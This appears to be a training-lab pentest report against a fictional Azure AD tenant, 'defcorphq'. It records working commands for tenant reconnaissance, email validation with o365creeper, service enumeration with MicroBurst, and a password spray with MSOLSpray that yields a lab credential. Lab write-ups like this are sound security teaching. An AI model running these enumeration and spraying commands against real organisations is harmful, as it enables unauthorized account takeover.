# Azure AD Pentest - Lab Report

- [Azure AD Pentest - Lab Report](#azure-ad-pentest---lab-report)
  - [Objective 1](#objective-1)
    - [Is the organization using Azure AD?](#is-the-organization-using-azure-ad)
    - [ID of Tenant](#id-of-tenant)
    - [Validate email IDs](#validate-email-ids)
    - [Azure Services used by the organization](#azure-services-used-by-the-organization)
  - [Objective 2](#objective-2)
    - [Questions](#questions)
    - [Brute force](#brute-force)
    - [Enumerate Users / Groups / Devices / Directory Roles / Enterprise Applications on Azure Portal](#enumerate-users--groups--devices--directory-roles--enterprise-applications-on-azure-portal)

---

## Objective 1

**Questions**

Gather the following information about the defcorphq organization:

- Is the organization using Azure AD? 
- ID of Tenant  
- Validate email IDs  
- Azure Services used by the organization

<br/>

**Answers**

### Is the organization using Azure AD?

To verify if the organization is using Azure AD, we can try to see if an Azure Tenant related to the company exists using the keyword `defcorphq`:

```
https://login.microsoftonline.com/getuserrealm.srf?login=root@defcorphq.onmicrosoft.com&xml=1
```

![picture 8](images/6f16946dc9aa1b7d764b965f76b96c8d40e79d972d2a4abd1151025be406cfe0.png)  

This confirms that the organization is in fact using Azure AD.

<br/>

We can also use AADInternals tool to enumerate:

```
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
Get-AADIntLoginInformation -UserName root@defcorphq.onmicrosoft.com
```

![picture 10](images/364e00f7c08cd9f835709b5c36ff4a00a6575fba38eeab49c61353f1d3478b67.png)  


<br/>

### ID of Tenant

To obtain the ID of the Tenant:

```
https://login.microsoftonline.com/defcorphq.onmicrosoft.com/.well-known/openid-configuration
```

![picture 9](images/ff229051a258e8547450a1e68c96ada916da30a271f3fbace94506dced24788f.png)  

The tenant ID is `2d50cb29-5f7b-48a4-87ce-fe75a941adb6`

<br/>

We can also use AADInternals tool:

```
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
```

![picture 11](images/22422075411b72570d3d03897981bee591dd9916ed6e3a3a4612d9881e71dd94.png)  


<br/>

### Validate email IDs

To enumerate valid email IDs, first we need a list of emails. For example:

![picture 12](images/00810d667085c8996d5f61c16adfa103e7da627bfdf5ff1e193e3b3153856dd0.png)  

Then we can use **o365creeper** to check if they are valid:

```
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o C:\AzAD\Tools\validemails.txt
```

![picture 13](images/452592e87c17ec2edd6a4e5d9ad3f0473305a41a54341798ba8470b19b735a4b.png)  

<br/>

### Azure Services used by the organization

To enumerate Azure Services used by the organization, we can use **MicroBurst**:

```
Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1 -Verbose
Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

![picture 15](images/cd7fe38ac88b9e8039379188cd898195a3d8c6740dca16d0f559e179a74fac1f.png)  

- Email (defcorphq.mail.protection.outlook.com)
- Microsoft Hosted Domain (defcorphq.onmicrosoft.com)
- SharePoint (defcorphq.sharepoint.com / defcorphq-my.sharepoint.com)

<br/>

---

## Objective 2

### Questions

- Brute-force one of the users that we enumerated from the defcorphq tenant.
- Enumerate the following for the defcorphq tenant using Azure Portal: 
  - Users
  - Groups
  - Devices
  - Directory Roles
  - Enterprise Applications

<br/>

### Brute force

With a valid email list obtained in Objective 1, we can use `MSOLSpray` to perform a password spray:

```
. C:\AzAD\Tools\MSOLSpray\MSOLSPray.ps1

Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password SuperVeryEasytoGuessPassword@1234 -Verbose
```

![picture 16](images/b61c3977af8c1c6babc4a0a82d94f05ab9f6a99a518a481c6e97fb03c039b905.png)  

As shown, we can access the Azure with the following credential:

- `test@defcorphq.onmicrosoft.com` / `SuperVeryEasytoGuessPassword@1234`

<br/>

### Enumerate Users / Groups / Devices / Directory Roles / Enterprise Applications on Azure Portal

First login with the found credentials:

- https://portal.azure.com

![picture 17](images/53636cf52d52e824c4cb86337aa5efee320ad88168dd1f651bfc14e9ead31da3.png)  

<br/>

To view users:

![picture 18](images/c963b6a64f7363b679249ce7075c415b9f0b59707eff3015ba1ad59983765175.png)  

![picture 19](images/b23325d8901224a8eeeff6def092453157a6d3a53915247cced5408a4e6a9471.png)  

<br/>

To view groups:

![picture 20](images/1ce3dbb45679d942cd2717ef9751676f6b94c004cce2bf565ad9e0494d221e16.png)  

![picture 21](images/2c4ab38e6fdcace6bbbbf39824b4472c26a35060b4a7d9f30e627e01a207997c.png)  

<br/>

To view Devices:

![picture 22](images/fd52410d1e2136936f1d332afbb3f028cd4de8b25f5bd6c4be240bab65d45c29.png)  

![picture 23](images/5e9272dfd466a43ccfc3bcf3dab8a73cbc6d2e292fcda0da70f951a9ba4fdd1c.png)  

<br/>

To view directory roles:

![picture 24](images/05f26e8788cff4ff437a8069779579ead4ad3422369620ba34c3c97df60ece52.png)  

![picture 25](images/07dcc7c7fd98f4aa14dd4bb453bc2958bae936370fe87f89ebf79109e502c832.png)  

<br/>

To view enterprise applications:

![picture 26](images/0fcca73fb76dd72c5d9ca2a18c78b3d859265571653a843609675928cfa20af9.png)  

![picture 27](images/a4c3375179ace4602b19318467f1a59065be3e7e3d8a139d49be31062c1db12f.png)  

<br/>

---

